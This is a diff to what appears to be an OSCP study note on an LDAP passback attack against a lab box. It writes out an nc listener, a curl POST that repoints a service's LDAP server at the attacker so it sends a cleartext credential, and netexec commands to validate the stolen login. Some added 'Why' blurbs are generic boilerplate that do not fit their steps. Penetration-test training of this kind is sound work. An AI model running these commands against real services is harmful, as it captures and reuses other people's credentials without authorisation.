@@ -8,12 +8,14 @@
 
 Start a raw TCP listener on the LDAP port:
 
+> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
 ```bash
 nc -lvnp $Port
 ```
 
 Trigger the outbound connection by pointing the service's LDAP server address at Kali:
 
+> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
 ```bash
 curl -s -X POST --data "ip=$LocalIP" http://$BoxIP/settings.php
 ```
@@ -30,8 +32,8 @@ LDAP Simple Bind for $Domain\$Username
 
 ## What did you get?
 
-- [ ] A cleartext credential was captured → **Store it with `boxset`, validate it with SMB and WinRM, then go to Step 40 · [[AD - Credential Validation]]**
-- [ ] No connection was received → **Check the form field name in the HTML source, confirm only the server address field is named and posted, and confirm `nc` is listening before submitting**
+- [ ] A cleartext credential was captured → **Run `boxset Username $Username` and `boxset Password $Password`, validate with `netexec smb $BoxIP -u $Username -p $Password`, then go to Step 40 · [[AD - Credential Validation]]**
+- [ ] No connection was received → **Run `curl -s http://$BoxIP/ | grep -i -A2 -B2 'server'`, confirm the server-address field is posted, run `ss -ltnp | grep 389`, then submit the form once**
 
 ## Notes
 
@@ -51,3 +53,14 @@ The browser may mask the password, but the service sends its stored value when i
 
 - [HackTricks, LDAP Attacks](https://book.hacktricks.wiki/en/pentesting/pentesting-ldap.html)
 - [PayloadsAllTheThings, LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
+## Seen in
+- [[OSCP/BOXES/WRITE UPS/AD/Return|Return]] -- confirmed in the box write-up
+
+## Related stages
+
+- [[AD - Service Scan]]
+- [[AD - Credential Validation]]
+- [[AD - BloodHound]]
+## Why this matters for OSCP
+
+This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
